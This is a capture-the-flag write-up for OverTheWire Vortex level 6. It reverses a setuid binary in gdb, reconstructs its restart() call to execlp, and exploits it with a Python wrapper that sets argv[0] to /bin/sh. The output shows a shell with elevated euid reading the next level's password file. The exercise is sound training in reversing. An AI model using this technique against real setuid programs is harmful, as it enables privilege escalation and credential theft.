---
title:  "[CTF] OverTheWire Vortex Level 6"
categories: [CTF, OverTheWire]
---

![Logo](/assets/images/vortex6.png)

## Context

For [this level](http://overthewire.org/wargames/vortex/vortex6.html) we have just the binary, not the source code and some reversing tutorials are suggested. First, we'll download it and study it locally with _`gdb`_.
```bash
(gdb) set disassembly-flavor intel
(gdb) disassemble main 
Dump of assembler code for function main:
   0x08048446 <+0>: push   ebp
   0x08048447 <+1>: mov    ebp,esp
   0x08048449 <+3>: and    esp,0xfffffff0
   0x0804844c <+6>: sub    esp,0x10
   0x0804844f <+9>: mov    eax,DWORD PTR [ebp+0x10]
   0x08048452 <+12>: mov    eax,DWORD PTR [eax]
   0x08048454 <+14>: test   eax,eax
   0x08048456 <+16>: je     0x8048465 <main>
   0x08048458 <+18>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804845b <+21>: mov    eax,DWORD PTR [eax]
   0x0804845d <+23>: mov    DWORD PTR [esp],eax
   0x08048460 <+26>: call   0x8048424 <restart>
   0x08048465 <+31>: mov    eax,DWORD PTR [ebp+0x10]
   0x08048468 <+34>: add    eax,0xc
   0x0804846b <+37>: mov    eax,DWORD PTR [eax]
   0x0804846d <+39>: mov    DWORD PTR [esp],eax
   0x08048470 <+42>: call   0x8048354 <printf@plt>
   0x08048475 <+47>: mov    DWORD PTR [esp],0x7325
   0x0804847c <+54>: call   0x8048334 <_exit@plt>
End of assembler dump.
(gdb) disassemble restart 
Dump of assembler code for function restart:
   0x08048424 <+0>: push   ebp
   0x08048425 <+1>: mov    ebp,esp
   0x08048427 <+3>: sub    esp,0x18
   0x0804842a <+6>: mov    DWORD PTR [esp+0x8],0x0
   0x08048432 <+14>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048435 <+17>: mov    DWORD PTR [esp+0x4],eax
   0x08048439 <+21>: mov    eax,DWORD PTR [ebp+0x8]
   0x0804843c <+24>: mov    DWORD PTR [esp],eax
   0x0804843f <+27>: call   0x8048344 @lt;execlp@plt>
   0x08048444 <+32>: leave  
   0x08048445 <+33>: ret    
End of assembler dump.
```

After the function prologue and [alignment of stack pointer to 4-byte boundary](https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack), 16 bytes are subtracted from _`ESP`_ to make room for local variables. Throughout the code of _`main`_ function, there are references to 2 locations we need to understand: `_ebp+0x10`_ and _`ebp+0x0c`_. [This article](https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames) explains basics about stack frames, while [the next one](http://www.win.tue.nl/~aeb/linux/hh/stack-layout.html) details also the stack layout. The stack layout before calling the main function looks like this:
```
:    :
|    | [ebp + 16] (env - address of env array)
|    | [ebp + 12] (argv - address of argv array)
|    | [ebp + 8]  (argc - number of arguments passed to main)
|    | [ebp + 4]  (return address)
|    | [ebp]      (old ebp value)
|    | [ebp - 4]  (1st local variable)
:    :
```

We can quickly verify this with the following wrapper program, that runs a target program with different arguments. [This thread](https://stackoverflow.com/questions/2114163/reading-a-register-value-into-a-c-variable) shows a way to read registers (_`ebp`_ in our case) with inline assembly from C code compiled with GCC.
```c
#include <stdio .h>
 
int main() {
    register int ebp asm("ebp");    
     
    char **env = *(char***)(ebp + 16);
    char **argv = *(char ***)(ebp + 12);
    int argc = *(int*)(ebp + 8);
     
    printf("[EBP + 16] - First element of env[] array: %s\n", env[0]);
    printf("[EBP + 12] - First element of argv[] array: %s\n", argv[0]); 
    printf("[EBP +  8] - Number of arguments (argc): %d\n", argc);
}
```

And the test wraper: 
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main(int argc, char* argv[]) {
 
    char* arg[] = {"ARG0", "ARG1", "ARG2", "ARG3", "ARG4", "ARG5", NULL};
    char* env[] = {"ENV0", "ENV1", "ENV2", "ENV3", NULL};
 
    execve("./layout",arg,env);
}
```

So we have: 
```bash
# gcc layout.c -o layout
# gcc wrap.c -o wrap
# ./wrap 
[EBP + 16] - First element of env[] array: ENV0
[EBP + 12] - First element of argv[] array: ARG0
[EBP +  8] - Number of arguments (argc): 6
``` 

Based on that, we see that the vortex6 binary checks the first environment variable, and if it's not _`NULL`_ it executes the _`restart`_ function with _`argv[0]`_ as parameter. We see that _`reconstruct()`_ function calls _`execlp`_, with first two arguments the value from _`**(ebp+8)`_, and the third one _`NULL`_. When calling restart function, the stack looks like this:
```bash
:    :
|    | [ebp + 12] (2nd argument)
|    | [ebp + 8]  (1st argument)
| RA | [ebp + 4]  (return address)
| FP | [ebp]      (old ebp value)
|    | [ebp - 4]  (1st local variable)
```

So wee see that at _`ebp + 8`_ we have its first argument, which is in fact _`argv[0]`_. Basically the reconstructed function is:
```c
void restart(char *s) {
    execlp(s,s,NULL);
}
```

After reversing the whole functionality, it's easy to exploit the binary using a simple Python wrapper:
```python
import subprocess
 
argv = ['/bin/sh']
 
p = subprocess.Popen(argv, executable = './vortex6.bin')        
p.wait()
```

And tada...
```bash
vortex6@melissa:~$ python /tmp/myl6.py
$ id
uid=5006(vortex6) gid=5006(vortex6) euid=5007(vortex7) groups=5007(vortex7),5006(vortex6)
$ cat /etc/vortex_pass/vortex7
*****
```
